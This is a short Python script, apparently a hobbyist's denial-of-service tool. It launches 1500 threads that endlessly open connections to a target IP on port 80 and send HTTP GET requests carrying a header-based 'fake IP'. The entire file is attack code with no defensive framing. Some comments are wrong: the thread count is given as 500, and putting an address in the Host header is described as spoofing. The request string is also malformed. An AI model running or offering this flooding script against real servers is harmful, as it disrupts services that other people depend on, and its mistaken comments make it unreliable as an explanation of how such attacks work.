import socket #sending requests to a host on a specific host over an over again
import threading #speeds the process

target = '192.168.1.196'
fake_ip = '197.168.1.10'
port = 80

attack_num = 0 #this variable will keep track of the number of times the attack function is run

def attack(): #this function will be running in each of the individual threads
    while True: #it starts as an infinite loop which creates a socket and sends a request to the target over and over again
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port)) #injecting our fake ip address into the request
        s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode('ascii'), (target, port)) #the request is encoded in bytes and sent to the server
        s.sendto(("Host: " + fake_ip + "\r\n").encode('ascii'), (target, port))

        global attack_num
        attack_num += 1
        print(attack_num)

        s.close() #at the end of each loop, the socket is closed
        
for i in range(1500): #this loop will create 500 threads
    thread = threading.Thread(target=attack) #each thread will run the attack function
    thread.start() #the thread is started
